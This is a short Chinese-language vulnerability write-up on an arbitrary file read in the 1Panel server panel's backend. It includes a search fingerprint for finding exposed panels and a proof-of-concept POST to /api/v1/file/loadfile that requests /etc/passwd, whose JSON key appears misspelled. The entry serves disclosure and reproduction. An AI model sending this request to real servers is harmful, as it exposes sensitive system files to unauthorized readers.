---
title: "1Panel loadfile 后台文件读取漏洞"
date: 2026-10-16 09:06:16
categories:
  - WebSecurity
  - CVE
  - "Web应用"
  - "1Panel"
tags:
  - "1Panel"
  - "任意文件读取"
  - "信息泄露"
  - "漏洞复现"
---
## 漏洞描述

1Panel 是一个现代化、开源的Linux 服务器运维管理面板。

1Panel 后台存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器中的敏感信息文件

## 漏洞影响

1Panel

## 网络测绘

```
"1Panel"
```

## 漏洞复现

登陆页面

![image-20230828162515540](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/image-20230828162515540.png)

![image-20230828162528792](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/image-20230828162528792.png)

![image-20230828162539743](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/image-20230828162539743.png)

验证POC

```
POST /api/v1/file/loadfile

{"paht":"/etc/passwd"}
```

![image-20230828162553584](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/image-20230828162553584.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/webapp/1Panel-loadfile-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md)
